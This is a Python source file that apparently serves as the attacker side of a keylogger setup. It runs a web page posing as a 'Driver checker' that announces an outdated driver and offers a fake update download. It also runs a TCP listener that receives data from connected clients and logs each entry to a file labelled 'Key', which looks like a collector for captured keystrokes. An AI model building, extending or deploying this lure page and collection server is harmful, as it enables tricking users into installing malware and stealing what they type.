from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import socket
import sys

hostName = "localhost"
serverPort = 80

listeningPort = 8080

class WebServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><head><title>Database</title> <style>body {    background-color: #151515;  }    * {    font-family: 'Roboto', sans-serif;      }  a{    text-decoration: none;    color: inherit;  }  p{    color: #61CA87;    font-size: 2vw;  }  h1{    color: #61CA87;    text-transform: uppercase;  }  h2{    font-size: 3vw;  }  .container {    margin: 0 auto;    max-width: 50%;  }    header {    text-align: center;    color: white;  }  footer ul{    list-style-type: none;    margin: 0;    padding: 0;    overflow: hidden;    display: grid;  }    main {    padding: 50px;    color: white;    text-align: center;  }    footer {    background-color: #21482f;    color: white;    text-align: center;    padding: 20px;  }    @media (max-width: 600px) {    .container {      margin: 0 auto;      max-width: 100%;    }    main {      padding: 20px;    }    }  </style></head>", "utf-8"))
        self.wfile.write(bytes('<!DOCTYPE html><html>  <head><link rel="stylesheet" type="text/css" href="template.css">    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">  </head>  <body>    <div class="container">      <header>        <h1>Driver checker</h1>      </header>      <main>        <h2>Outdated driver detected!</h2>        <a href="#"><p>Click here to download an update</p></a>      </main>      <footer>        <ul>            <li>                Copyright Â© <script>document.write(new Date().getFullYear())</script> DriverChecker            </li>        </ul>      </footer>    </div>  </body></html>', "ISO-8859-1"))

def startServer():
    try:
        webServer = HTTPServer((hostName, serverPort), WebServer)
        print(f"\nServer running on {hostName} and port {serverPort}")
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        print("\nClosing server")
        webServer.server_close()



class Server:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.bind(('localhost', self._port))

    @property
    def port(self):
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port
    
    @property
    def host(self):
        return self.host

    @port.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def socket(self):
        return self._socket

    
    def connect(self):
        self.socket.listen()
        print(f"\nServer listening on {self.port}")
        logging.debug("\nServer successfully initialized!")
        print("\nServer trying to establish connection")
        while True:
            connection, adress = self.socket.accept()
            print(f"\nSuccessfully established connection with {adress}")
            logging.debug(f"Server has established connection with {adress}")
            try:
                while True:
                    data = connection.recv(1024).decode()
                    if not data:
                        break
                    print(f'Received data: {data}')
                    logging.debug(data)
                    connection.send(bytes("Data received", 'utf-8'))
            except (ConnectionResetError):
                print("Client has disconnected")


 
def Start():
    server = Server('localhost', listeningPort)
    server.connect()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Time: %(asctime)s | Key: %(message)s')
    Start()